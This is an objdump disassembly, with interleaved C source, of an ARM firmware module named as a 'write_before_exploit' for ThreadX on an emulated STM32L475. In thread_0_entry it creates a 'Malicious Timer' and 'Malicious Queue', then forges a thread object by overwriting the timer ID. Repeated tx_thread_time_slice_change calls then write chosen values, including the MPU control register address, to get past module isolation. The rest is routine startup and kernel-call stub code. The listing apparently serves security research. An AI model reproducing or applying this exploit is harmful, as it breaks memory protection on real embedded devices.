
qemu_stm32l475_m4_write_before_exploit.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .preamble     000000a0  08020000  08020000  00010000  2**4
                  CONTENTS, ALLOC, LOAD, CODE
  1 .dynsym       00000000  080200a0  08020640  00010640  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  2 .dynstr       00000000  080200a0  08020640  00010640  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  3 .rel.dyn      00000000  080200a0  080200a0  000100a0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  4 .got          00000028  080205d4  080205d4  000105d4  2**2
                  CONTENTS, ALLOC, LOAD, RELOC, DATA
  5 .plt          00000000  080200a0  08020640  00010640  2**0
                  CONTENTS, ALLOC, LOAD, CODE
  6 .interp       00000000  080200a0  080200a0  00010640  2**0
                  CONTENTS
  7 .hash         00000000  080200a0  08020640  00010640  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  8 .text         00000534  080200a0  080200a0  000100a0  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  9 .rodata       00000044  080205fc  080205fc  000105fc  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 10 .fast_run     00000000  20020028  20020028  00010640  2**0
                  CONTENTS
 11 .data_run     00000000  20020028  20020028  00010640  2**0
                  CONTENTS
 12 .bss          00000840  20020028  20020028  00020028  2**3
                  ALLOC
 13 .heap         00000080  20020868  20020868  00020028  2**0
                  ALLOC
 14 .ARM.attributes 00000030  00000000  00000000  00010640  2**0
                  CONTENTS, READONLY
 15 .comment      00000043  00000000  00000000  00010670  2**0
                  CONTENTS, READONLY
 16 .debug_line   0002c211  00000000  00000000  000106b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_line_str 000000b9  00000000  00000000  0003c8c4  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_info   0000993c  00000000  00000000  0003c97d  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_abbrev 00002121  00000000  00000000  000462b9  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_aranges 00000a10  00000000  00000000  000483e0  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_str    000161a4  00000000  00000000  00048df0  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 22 .debug_loclists 0000076e  00000000  00000000  0005ef94  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 23 .debug_macro  0000c84e  00000000  00000000  0005f702  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 24 .debug_frame  00000368  00000000  00000000  0006bf50  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .preamble:

08020000 <__preamble_start__>:
 8020000:	4d4f4455 	.word	0x4d4f4455
 8020004:	00000006 	.word	0x00000006
 8020008:	00000001 	.word	0x00000001
 802000c:	00000020 	.word	0x00000020
 8020010:	12345678 	.word	0x12345678
 8020014:	02000007 	.word	0x02000007
 8020018:	000003e5 	.word	0x000003e5
 802001c:	0000023d 	.word	0x0000023d
 8020020:	00000000 	.word	0x00000000
 8020024:	00000001 	.word	0x00000001
 8020028:	00000400 	.word	0x00000400
 802002c:	00000319 	.word	0x00000319
 8020030:	00000001 	.word	0x00000001
 8020034:	00000400 	.word	0x00000400
 8020038:	00000640 	.word	0x00000640
 802003c:	000008e8 	.word	0x000008e8
	...
 8020080:	00001f41 	.word	0x00001f41
 8020084:	61656100 	.word	0x61656100
 8020088:	01006962 	.word	0x01006962
 802008c:	00000015 	.word	0x00000015
 8020090:	2d453705 	.word	0x2d453705
 8020094:	0d06004d 	.word	0x0d06004d
 8020098:	02094d07 	.word	0x02094d07
 802009c:	011b080a 	.word	0x011b080a

Disassembly of section .text:

080200a0 <_gcc_setup>:

    .global _gcc_setup
    .thumb_func
_gcc_setup:

    STMDB   sp!, {r3, r4, r5, r6, r7, lr}             // Store other preserved registers
 80200a0:	e92d 40f8 	stmdb	sp!, {r3, r4, r5, r6, r7, lr}

    ldr     r3, =__FLASH_segment_start__
 80200a4:	4b2e      	ldr	r3, [pc, #184]	; (8020160 <memory_set_done+0x2>)
    ldr     r4, =__RAM_segment_start__
 80200a6:	4c2f      	ldr	r4, [pc, #188]	; (8020164 <memory_set_done+0x6>)
    mov     r5,r0
 80200a8:	4605      	mov	r5, r0

    /* Copy GOT table. */

    ldr     r0, =__got_load_start__
 80200aa:	482f      	ldr	r0, [pc, #188]	; (8020168 <memory_set_done+0xa>)
    sub     r0,r0,r3
 80200ac:	eba0 0003 	sub.w	r0, r0, r3
    add     r0,r0,r5
 80200b0:	4428      	add	r0, r5
    ldr     r1, =__new_got_start__
 80200b2:	492e      	ldr	r1, [pc, #184]	; (802016c <memory_set_done+0xe>)
    sub     r1,r1, r4
 80200b4:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 80200b8:	4449      	add	r1, r9
    ldr     r2, =__new_got_end__
 80200ba:	4a2d      	ldr	r2, [pc, #180]	; (8020170 <memory_set_done+0x12>)
    sub     r2,r2,r4
 80200bc:	eba2 0204 	sub.w	r2, r2, r4
    add     r2,r2,r9
 80200c0:	444a      	add	r2, r9

080200c2 <new_got_setup>:

new_got_setup:
    cmp     r1, r2          // See if there are more GOT entries
 80200c2:	4291      	cmp	r1, r2
    beq     got_setup_done  // No, done with GOT setup
 80200c4:	d011      	beq.n	80200ea <got_setup_done>
    ldr     r6, [r0]        // Pickup current GOT entry
 80200c6:	6806      	ldr	r6, [r0, #0]
    cmp     r6, #0          // Is it 0?
 80200c8:	2e00      	cmp	r6, #0
    beq     address_built   // Yes, just skip the adjustment
 80200ca:	d008      	beq.n	80200de <address_built>
    cmp     r6, r4          // Is it in the code or data area?
 80200cc:	42a6      	cmp	r6, r4
    blt     flash_area      // If less than, it is a code address
 80200ce:	db03      	blt.n	80200d8 <flash_area>
    sub     r6, r6, r4      // Compute offset of data area
 80200d0:	eba6 0604 	sub.w	r6, r6, r4
    add     r6, r6, r9      // Build address based on the loaded data address
 80200d4:	444e      	add	r6, r9
    b       address_built   // Finished building address
 80200d6:	e002      	b.n	80200de <address_built>

080200d8 <flash_area>:
flash_area:
    sub     r6, r6, r3      // Compute offset of code area
 80200d8:	eba6 0603 	sub.w	r6, r6, r3
    add     r6, r6, r5      // Build address based on the loaded code address
 80200dc:	442e      	add	r6, r5

080200de <address_built>:
address_built:
    str     r6, [r1]        // Store in new GOT table
 80200de:	600e      	str	r6, [r1, #0]
    add     r0, r0, #4      // Move to next entry
 80200e0:	f100 0004 	add.w	r0, r0, #4
    add     r1, r1, #4      //
 80200e4:	f101 0104 	add.w	r1, r1, #4
    b       new_got_setup   // Continue at the top of the loop
 80200e8:	e7eb      	b.n	80200c2 <new_got_setup>

080200ea <got_setup_done>:
got_setup_done:

    /* Copy initialised sections into RAM if required. */
  
    ldr     r0, =__data_load_start__
 80200ea:	4822      	ldr	r0, [pc, #136]	; (8020174 <memory_set_done+0x16>)
    sub     r0,r0,r3
 80200ec:	eba0 0003 	sub.w	r0, r0, r3
    add     r0,r0,r5
 80200f0:	4428      	add	r0, r5
    ldr     r1, =__data_start__
 80200f2:	4921      	ldr	r1, [pc, #132]	; (8020178 <memory_set_done+0x1a>)
    sub     r1,r1, r4
 80200f4:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 80200f8:	4449      	add	r1, r9
    ldr     r2, =__data_end__
 80200fa:	4a20      	ldr	r2, [pc, #128]	; (802017c <memory_set_done+0x1e>)
    sub     r2,r2,r4
 80200fc:	eba2 0204 	sub.w	r2, r2, r4
    add     r2,r2,r9
 8020100:	444a      	add	r2, r9
    bl      crt0_memory_copy
 8020102:	f000 f815 	bl	8020130 <crt0_memory_copy>
  
    /* Zero bss. */
    
    ldr     r0, =__bss_start__
 8020106:	481e      	ldr	r0, [pc, #120]	; (8020180 <memory_set_done+0x22>)
    sub     r0,r0,r4
 8020108:	eba0 0004 	sub.w	r0, r0, r4
    add     r0,r0,r9
 802010c:	4448      	add	r0, r9
    ldr     r1, =__bss_end__
 802010e:	491d      	ldr	r1, [pc, #116]	; (8020184 <memory_set_done+0x26>)
    sub     r1,r1,r4
 8020110:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 8020114:	4449      	add	r1, r9
    mov     r2, #0
 8020116:	f04f 0200 	mov.w	r2, #0
    bl      crt0_memory_set
 802011a:	f000 f81a 	bl	8020152 <crt0_memory_set>

    
    LDMIA   sp!, {r3, r4, r5, r6, r7, lr}       // Store other preserved registers
 802011e:	e8bd 40f8 	ldmia.w	sp!, {r3, r4, r5, r6, r7, lr}
    bx      lr                                  // Return to caller
 8020122:	4770      	bx	lr
 8020124:	f3af 8000 	nop.w
 8020128:	f3af 8000 	nop.w
 802012c:	f3af 8000 	nop.w

08020130 <crt0_memory_copy>:

  /* Startup helper functions. */

    .thumb_func
crt0_memory_copy:
    cmp     r0, r1
 8020130:	4288      	cmp	r0, r1
    beq     memory_copy_done
 8020132:	d00d      	beq.n	8020150 <memory_copy_done>
    cmp     r2, r1
 8020134:	428a      	cmp	r2, r1
    beq     memory_copy_done
 8020136:	d00b      	beq.n	8020150 <memory_copy_done>
    sub     r2, r2, r1
 8020138:	eba2 0201 	sub.w	r2, r2, r1

0802013c <memory_copy_loop>:
memory_copy_loop:
    ldrb    r3, [r0]
 802013c:	7803      	ldrb	r3, [r0, #0]
    add     r0, r0, #1
 802013e:	f100 0001 	add.w	r0, r0, #1
    strb    r3, [r1]
 8020142:	700b      	strb	r3, [r1, #0]
    add     r1, r1, #1
 8020144:	f101 0101 	add.w	r1, r1, #1
    sub     r2, r2, #1
 8020148:	f1a2 0201 	sub.w	r2, r2, #1
    cmp     r2, #0
 802014c:	2a00      	cmp	r2, #0
    bne     memory_copy_loop
 802014e:	d1f5      	bne.n	802013c <memory_copy_loop>

08020150 <memory_copy_done>:
memory_copy_done:
    bx      lr
 8020150:	4770      	bx	lr

08020152 <crt0_memory_set>:

    .thumb_func
crt0_memory_set:
    cmp     r0, r1
 8020152:	4288      	cmp	r0, r1
    beq     memory_set_done
 8020154:	d003      	beq.n	802015e <memory_set_done>
    strb    r2, [r0]
 8020156:	7002      	strb	r2, [r0, #0]
    add     r0, r0, #1
 8020158:	f100 0001 	add.w	r0, r0, #1
    b       crt0_memory_set
 802015c:	e7f9      	b.n	8020152 <crt0_memory_set>

0802015e <memory_set_done>:
memory_set_done:
    bx      lr
 802015e:	4770      	bx	lr
    ldr     r3, =__FLASH_segment_start__
 8020160:	08020000 	.word	0x08020000
    ldr     r4, =__RAM_segment_start__
 8020164:	20020000 	.word	0x20020000
    ldr     r0, =__got_load_start__
 8020168:	080205d4 	.word	0x080205d4
    ldr     r1, =__new_got_start__
 802016c:	20020000 	.word	0x20020000
    ldr     r2, =__new_got_end__
 8020170:	20020028 	.word	0x20020028
    ldr     r0, =__data_load_start__
 8020174:	08020640 	.word	0x08020640
    ldr     r1, =__data_start__
 8020178:	20020028 	.word	0x20020028
    ldr     r2, =__data_end__
 802017c:	20020028 	.word	0x20020028
    ldr     r0, =__bss_start__
 8020180:	20020028 	.word	0x20020028
    ldr     r1, =__bss_end__
 8020184:	20020868 	.word	0x20020868

08020188 <MaliciousTimerFunction>:
{
  /* Nothing to do, block here */
  tx_thread_sleep(TX_WAIT_FOREVER);
}

void MaliciousTimerFunction(void){}
 8020188:	4770      	bx	lr

0802018a <thread_0_entry>:
{
 802018a:	b5f0      	push	{r4, r5, r6, r7, lr}
 802018c:	b08b      	sub	sp, #44	; 0x2c
    txm_module_object_allocate((void*)&MaliciousTimer, sizeof(TX_TIMER));
 802018e:	2134      	movs	r1, #52	; 0x34
 8020190:	a808      	add	r0, sp, #32
 8020192:	f000 f917 	bl	80203c4 <_txm_module_object_allocate>
    tx_timer_create(MaliciousTimer, "Malicious Timer", MaliciousTimerFunction, 0x54485244, 0x54485244, 0x54485244, TX_NO_ACTIVATE);
 8020196:	4c2a      	ldr	r4, [pc, #168]	; (8020240 <thread_0_entry+0xb6>)
 8020198:	4b2b      	ldr	r3, [pc, #172]	; (8020248 <thread_0_entry+0xbe>)
 802019a:	f859 2003 	ldr.w	r2, [r9, r3]
 802019e:	2334      	movs	r3, #52	; 0x34
 80201a0:	9303      	str	r3, [sp, #12]
 80201a2:	2600      	movs	r6, #0
 80201a4:	9602      	str	r6, [sp, #8]
 80201a6:	9401      	str	r4, [sp, #4]
 80201a8:	9400      	str	r4, [sp, #0]
 80201aa:	4623      	mov	r3, r4
 80201ac:	4927      	ldr	r1, [pc, #156]	; (802024c <thread_0_entry+0xc2>)
 80201ae:	4479      	add	r1, pc
 80201b0:	9808      	ldr	r0, [sp, #32]
 80201b2:	f000 f9f5 	bl	80205a0 <_txe_timer_create>
    txm_module_object_allocate((void*)&MaliciousQueue, sizeof(TX_QUEUE));
 80201b6:	2144      	movs	r1, #68	; 0x44
 80201b8:	a807      	add	r0, sp, #28
 80201ba:	f000 f903 	bl	80203c4 <_txm_module_object_allocate>
    tx_byte_allocate(byte_pool_0, (VOID **) &pointer, 16 * sizeof(ULONG), TX_NO_WAIT);
 80201be:	4b24      	ldr	r3, [pc, #144]	; (8020250 <thread_0_entry+0xc6>)
 80201c0:	f859 0003 	ldr.w	r0, [r9, r3]
 80201c4:	4633      	mov	r3, r6
 80201c6:	2240      	movs	r2, #64	; 0x40
 80201c8:	a909      	add	r1, sp, #36	; 0x24
 80201ca:	6800      	ldr	r0, [r0, #0]
 80201cc:	f000 f894 	bl	80202f8 <_txe_byte_allocate>
    tx_queue_create(MaliciousQueue, "Malicious Queue",TX_1_ULONG, pointer, 16 * sizeof(ULONG));
 80201d0:	2344      	movs	r3, #68	; 0x44
 80201d2:	9301      	str	r3, [sp, #4]
 80201d4:	2340      	movs	r3, #64	; 0x40
 80201d6:	9300      	str	r3, [sp, #0]
 80201d8:	9b09      	ldr	r3, [sp, #36]	; 0x24
 80201da:	2201      	movs	r2, #1
 80201dc:	491d      	ldr	r1, [pc, #116]	; (8020254 <thread_0_entry+0xca>)
 80201de:	4479      	add	r1, pc
 80201e0:	9807      	ldr	r0, [sp, #28]
 80201e2:	f000 f945 	bl	8020470 <_txe_queue_create>
    MaliciousTimer->tx_timer_id = 0xffffffff;
 80201e6:	f04f 37ff 	mov.w	r7, #4294967295
 80201ea:	9b08      	ldr	r3, [sp, #32]
 80201ec:	601f      	str	r7, [r3, #0]
    tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 80201ee:	ad06      	add	r5, sp, #24
 80201f0:	462a      	mov	r2, r5
 80201f2:	4621      	mov	r1, r4
 80201f4:	9808      	ldr	r0, [sp, #32]
 80201f6:	3008      	adds	r0, #8
 80201f8:	f000 f9c4 	bl	8020584 <_txe_thread_time_slice_change>
    tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 80201fc:	462a      	mov	r2, r5
 80201fe:	4621      	mov	r1, r4
 8020200:	9808      	ldr	r0, [sp, #32]
 8020202:	3020      	adds	r0, #32
 8020204:	f000 f9be 	bl	8020584 <_txe_thread_time_slice_change>
    tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 8020208:	462a      	mov	r2, r5
 802020a:	4621      	mov	r1, r4
 802020c:	9808      	ldr	r0, [sp, #32]
 802020e:	3038      	adds	r0, #56	; 0x38
 8020210:	f000 f9b8 	bl	8020584 <_txe_thread_time_slice_change>
    tx_thread_time_slice_change(ForgedThread, 0xe000ed94, &time_slice);
 8020214:	462a      	mov	r2, r5
 8020216:	490b      	ldr	r1, [pc, #44]	; (8020244 <thread_0_entry+0xba>)
 8020218:	9808      	ldr	r0, [sp, #32]
 802021a:	3054      	adds	r0, #84	; 0x54
 802021c:	f000 f9b2 	bl	8020584 <_txe_thread_time_slice_change>
    tx_thread_time_slice_change(ForgedThread, 0x4, &time_slice);
 8020220:	462a      	mov	r2, r5
 8020222:	2104      	movs	r1, #4
 8020224:	9808      	ldr	r0, [sp, #32]
 8020226:	3038      	adds	r0, #56	; 0x38
 8020228:	f000 f9ac 	bl	8020584 <_txe_thread_time_slice_change>
    ULONG value = 0;
 802022c:	9605      	str	r6, [sp, #20]
    tx_queue_send(MaliciousQueue, &value, 0);
 802022e:	4632      	mov	r2, r6
 8020230:	a905      	add	r1, sp, #20
 8020232:	9807      	ldr	r0, [sp, #28]
 8020234:	f000 f940 	bl	80204b8 <_txe_queue_send>
    MaliciousTimer->tx_timer_id = 0xffffffff;
 8020238:	9b08      	ldr	r3, [sp, #32]
 802023a:	601f      	str	r7, [r3, #0]
}
 802023c:	b00b      	add	sp, #44	; 0x2c
 802023e:	bdf0      	pop	{r4, r5, r6, r7, pc}
 8020240:	54485244 	.word	0x54485244
 8020244:	e000ed94 	.word	0xe000ed94
 8020248:	00000000 	.word	0x00000000
 802024c:	0000044a 	.word	0x0000044a
 8020250:	00000010 	.word	0x00000010
 8020254:	0000042a 	.word	0x0000042a

08020258 <default_module_start>:
{
 8020258:	b530      	push	{r4, r5, lr}
 802025a:	b08b      	sub	sp, #44	; 0x2c
    txm_module_object_allocate((void*)&thread_0, sizeof(TX_THREAD));
 802025c:	4b1c      	ldr	r3, [pc, #112]	; (80202d0 <default_module_start+0x78>)
 802025e:	f859 5003 	ldr.w	r5, [r9, r3]
 8020262:	21e8      	movs	r1, #232	; 0xe8
 8020264:	4628      	mov	r0, r5
 8020266:	f000 f8ad 	bl	80203c4 <_txm_module_object_allocate>
    txm_module_object_allocate((void*)&byte_pool_0, sizeof(TX_BYTE_POOL));
 802026a:	4b1a      	ldr	r3, [pc, #104]	; (80202d4 <default_module_start+0x7c>)
 802026c:	f859 4003 	ldr.w	r4, [r9, r3]
 8020270:	2134      	movs	r1, #52	; 0x34
 8020272:	4620      	mov	r0, r4
 8020274:	f000 f8a6 	bl	80203c4 <_txm_module_object_allocate>
    tx_byte_pool_create(byte_pool_0, "module byte pool 0", (UCHAR*)default_module_pool_space, DEFAULT_BYTE_POOL_SIZE);
 8020278:	4b17      	ldr	r3, [pc, #92]	; (80202d8 <default_module_start+0x80>)
 802027a:	f859 2003 	ldr.w	r2, [r9, r3]
 802027e:	6820      	ldr	r0, [r4, #0]
 8020280:	2334      	movs	r3, #52	; 0x34
 8020282:	9300      	str	r3, [sp, #0]
 8020284:	f44f 6300 	mov.w	r3, #2048	; 0x800
 8020288:	4914      	ldr	r1, [pc, #80]	; (80202dc <default_module_start+0x84>)
 802028a:	4479      	add	r1, pc
 802028c:	f000 f846 	bl	802031c <_txe_byte_pool_create>
    tx_byte_allocate(byte_pool_0, (VOID **) &pointer, DEFAULT_STACK_SIZE, TX_NO_WAIT);
 8020290:	2300      	movs	r3, #0
 8020292:	f44f 7200 	mov.w	r2, #512	; 0x200
 8020296:	a909      	add	r1, sp, #36	; 0x24
 8020298:	6820      	ldr	r0, [r4, #0]
 802029a:	f000 f82d 	bl	80202f8 <_txe_byte_allocate>
    tx_thread_create(thread_0, "module thread 0", thread_0_entry, 0,
 802029e:	4b10      	ldr	r3, [pc, #64]	; (80202e0 <default_module_start+0x88>)
 80202a0:	f859 2003 	ldr.w	r2, [r9, r3]
 80202a4:	6828      	ldr	r0, [r5, #0]
 80202a6:	23e8      	movs	r3, #232	; 0xe8
 80202a8:	9306      	str	r3, [sp, #24]
 80202aa:	2301      	movs	r3, #1
 80202ac:	9305      	str	r3, [sp, #20]
 80202ae:	2300      	movs	r3, #0
 80202b0:	9304      	str	r3, [sp, #16]
 80202b2:	2102      	movs	r1, #2
 80202b4:	9103      	str	r1, [sp, #12]
 80202b6:	9102      	str	r1, [sp, #8]
 80202b8:	f44f 7100 	mov.w	r1, #512	; 0x200
 80202bc:	9101      	str	r1, [sp, #4]
 80202be:	9909      	ldr	r1, [sp, #36]	; 0x24
 80202c0:	9100      	str	r1, [sp, #0]
 80202c2:	4908      	ldr	r1, [pc, #32]	; (80202e4 <default_module_start+0x8c>)
 80202c4:	4479      	add	r1, pc
 80202c6:	f000 f905 	bl	80204d4 <_txe_thread_create>
}
 80202ca:	b00b      	add	sp, #44	; 0x2c
 80202cc:	bd30      	pop	{r4, r5, pc}
 80202ce:	bf00      	nop
 80202d0:	00000014 	.word	0x00000014
 80202d4:	00000010 	.word	0x00000010
 80202d8:	0000000c 	.word	0x0000000c
 80202dc:	0000038e 	.word	0x0000038e
 80202e0:	00000018 	.word	0x00000018
 80202e4:	00000368 	.word	0x00000368

080202e8 <Error_Handler>:
{
 80202e8:	b508      	push	{r3, lr}
  tx_thread_sleep(TX_WAIT_FOREVER);
 80202ea:	f04f 30ff 	mov.w	r0, #4294967295
 80202ee:	f000 f93b 	bl	8020568 <_tx_thread_sleep>
}
 80202f2:	bd08      	pop	{r3, pc}

080202f4 <MainThread_Entry>:

void MainThread_Entry(ULONG thread_input){}
 80202f4:	4770      	bx	lr
 80202f6:	bf00      	nop

080202f8 <_txe_byte_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_allocate(TX_BYTE_POOL *pool_ptr, VOID **memory_ptr, ULONG memory_size, ULONG wait_option)
{
 80202f8:	b510      	push	{r4, lr}
 80202fa:	b082      	sub	sp, #8

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) memory_size;
 80202fc:	9200      	str	r2, [sp, #0]
    extra_parameters[1] = (ALIGN_TYPE) wait_option;
 80202fe:	9301      	str	r3, [sp, #4]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_ALLOCATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) memory_ptr, (ALIGN_TYPE) extra_parameters);
 8020300:	4b05      	ldr	r3, [pc, #20]	; (8020318 <_txe_byte_allocate+0x20>)
 8020302:	f859 3003 	ldr.w	r3, [r9, r3]
 8020306:	681c      	ldr	r4, [r3, #0]
 8020308:	466b      	mov	r3, sp
 802030a:	460a      	mov	r2, r1
 802030c:	4601      	mov	r1, r0
 802030e:	2009      	movs	r0, #9
 8020310:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 8020312:	b002      	add	sp, #8
 8020314:	bd10      	pop	{r4, pc}
 8020316:	bf00      	nop
 8020318:	00000004 	.word	0x00000004

0802031c <_txe_byte_pool_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_create(TX_BYTE_POOL *pool_ptr, CHAR *name_ptr, VOID *pool_start, ULONG pool_size, UINT pool_control_block_size)
{
 802031c:	b510      	push	{r4, lr}
 802031e:	b084      	sub	sp, #16

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) pool_start;
 8020320:	9201      	str	r2, [sp, #4]
    extra_parameters[1] = (ALIGN_TYPE) pool_size;
 8020322:	9302      	str	r3, [sp, #8]
    extra_parameters[2] = (ALIGN_TYPE) pool_control_block_size;
 8020324:	9b06      	ldr	r3, [sp, #24]
 8020326:	9303      	str	r3, [sp, #12]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_CREATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8020328:	4b05      	ldr	r3, [pc, #20]	; (8020340 <_txe_byte_pool_create+0x24>)
 802032a:	f859 3003 	ldr.w	r3, [r9, r3]
 802032e:	681c      	ldr	r4, [r3, #0]
 8020330:	ab01      	add	r3, sp, #4
 8020332:	460a      	mov	r2, r1
 8020334:	4601      	mov	r1, r0
 8020336:	200a      	movs	r0, #10
 8020338:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 802033a:	b004      	add	sp, #16
 802033c:	bd10      	pop	{r4, pc}
 802033e:	bf00      	nop
 8020340:	00000004 	.word	0x00000004

08020344 <_txm_module_callback_request_thread_entry>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _txm_module_callback_request_thread_entry(ULONG id)
{
 8020344:	b530      	push	{r4, r5, lr}
 8020346:	b08f      	sub	sp, #60	; 0x3c

    /* Disable warning of parameter not used. */
    TX_PARAMETER_NOT_USED(id);

    /* Pickup pointer to the request queue.  */
    request_queue =  _txm_module_entry_info -> txm_module_thread_entry_info_callback_request_queue;
 8020348:	4b1d      	ldr	r3, [pc, #116]	; (80203c0 <_txm_module_callback_request_thread_entry+0x7c>)
 802034a:	f859 3003 	ldr.w	r3, [r9, r3]
 802034e:	681b      	ldr	r3, [r3, #0]
 8020350:	6a5d      	ldr	r5, [r3, #36]	; 0x24
    /* Loop to process callback messages from the module manager.  */
    while(1)
    {

        /* Wait for the callback request for the module.  */
        status =  _txe_queue_receive(request_queue, (VOID *) &callback_message, TX_WAIT_FOREVER);
 8020352:	f04f 32ff 	mov.w	r2, #4294967295
 8020356:	a901      	add	r1, sp, #4
 8020358:	4628      	mov	r0, r5
 802035a:	f000 f89f 	bl	802049c <_txe_queue_receive>

        /* Check to see if a request was received.  */
        if (status != TX_SUCCESS)
 802035e:	2800      	cmp	r0, #0
 8020360:	d12b      	bne.n	80203ba <_txm_module_callback_request_thread_entry+0x76>
            /* This should not happen - get out of the loop.  */
            break;
        }

        /* Pickup the activation count in the message.  */
        activation_count =  callback_message.txm_module_callback_message_activation_count;
 8020362:	9c02      	ldr	r4, [sp, #8]

        /* Loop to call the callback function the correct number of times.  */
        while (activation_count)
 8020364:	e002      	b.n	802036c <_txm_module_callback_request_thread_entry+0x28>

                /* Setup timer callback pointer.  */
                timer_callback =  (void (*)(ULONG)) callback_message.txm_module_callback_message_application_function;

                /* Call application's timer callback.  */
                (timer_callback)((ULONG) callback_message.txm_module_callback_message_param_1);
 8020366:	9804      	ldr	r0, [sp, #16]
 8020368:	9b03      	ldr	r3, [sp, #12]
 802036a:	4798      	blx	r3
        while (activation_count)
 802036c:	2c00      	cmp	r4, #0
 802036e:	d0f0      	beq.n	8020352 <_txm_module_callback_request_thread_entry+0xe>
            activation_count--;
 8020370:	3c01      	subs	r4, #1
            switch (callback_message.txm_module_callback_message_type)
 8020372:	9b01      	ldr	r3, [sp, #4]
 8020374:	2b04      	cmp	r3, #4
 8020376:	d8f9      	bhi.n	802036c <_txm_module_callback_request_thread_entry+0x28>
 8020378:	a202      	add	r2, pc, #8	; (adr r2, 8020384 <_txm_module_callback_request_thread_entry+0x40>)
 802037a:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 802037e:	441a      	add	r2, r3
 8020380:	4710      	bx	r2
 8020382:	bf00      	nop
 8020384:	ffffffe3 	.word	0xffffffe3
 8020388:	00000015 	.word	0x00000015
 802038c:	0000001d 	.word	0x0000001d
 8020390:	00000025 	.word	0x00000025
 8020394:	0000002d 	.word	0x0000002d

                /* Setup events set callback pointer.  */
                events_set_notify =  (void (*)(TX_EVENT_FLAGS_GROUP *)) callback_message.txm_module_callback_message_application_function;

                /* Call events set notify callback.  */
                (events_set_notify)((TX_EVENT_FLAGS_GROUP *) callback_message.txm_module_callback_message_param_1);
 8020398:	9804      	ldr	r0, [sp, #16]
 802039a:	9b03      	ldr	r3, [sp, #12]
 802039c:	4798      	blx	r3

                break;
 802039e:	e7e5      	b.n	802036c <_txm_module_callback_request_thread_entry+0x28>

                /* Setup queue send callback pointer.  */
                queue_send_notify =  (void (*)(TX_QUEUE *)) callback_message.txm_module_callback_message_application_function;

                /* Call queue send notify callback.  */
                (queue_send_notify)((TX_QUEUE *) callback_message.txm_module_callback_message_param_1);
 80203a0:	9804      	ldr	r0, [sp, #16]
 80203a2:	9b03      	ldr	r3, [sp, #12]
 80203a4:	4798      	blx	r3

                break;
 80203a6:	e7e1      	b.n	802036c <_txm_module_callback_request_thread_entry+0x28>

                /* Setup semaphore put callback pointer.  */
                semaphore_put_notify =  (void (*)(TX_SEMAPHORE *)) callback_message.txm_module_callback_message_application_function;

                /* Call semaphore put notify callback.  */
                (semaphore_put_notify)((TX_SEMAPHORE *) callback_message.txm_module_callback_message_param_1);
 80203a8:	9804      	ldr	r0, [sp, #16]
 80203aa:	9b03      	ldr	r3, [sp, #12]
 80203ac:	4798      	blx	r3

                break;
 80203ae:	e7dd      	b.n	802036c <_txm_module_callback_request_thread_entry+0x28>

                /* Setup thread entry/exit callback pointer.  */
                thread_entry_exit_notify =  (void (*)(TX_THREAD *, UINT)) callback_message.txm_module_callback_message_application_function;

                /* Call thread entry/exit notify callback.  */
                (thread_entry_exit_notify)((TX_THREAD *) callback_message.txm_module_callback_message_param_1, (UINT) callback_message.txm_module_callback_message_param_2);
 80203b0:	9905      	ldr	r1, [sp, #20]
 80203b2:	9804      	ldr	r0, [sp, #16]
 80203b4:	9b03      	ldr	r3, [sp, #12]
 80203b6:	4798      	blx	r3

                break;
 80203b8:	e7d8      	b.n	802036c <_txm_module_callback_request_thread_entry+0x28>

                break;
            }
        }
    }
}
 80203ba:	b00f      	add	sp, #60	; 0x3c
 80203bc:	bd30      	pop	{r4, r5, pc}
 80203be:	bf00      	nop
 80203c0:	00000008 	.word	0x00000008

080203c4 <_txm_module_object_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_allocate(VOID **object_ptr, ULONG object_size)
{
 80203c4:	b510      	push	{r4, lr}
 80203c6:	460a      	mov	r2, r1

UINT return_value;

    /* Call module manager dispatcher.  */
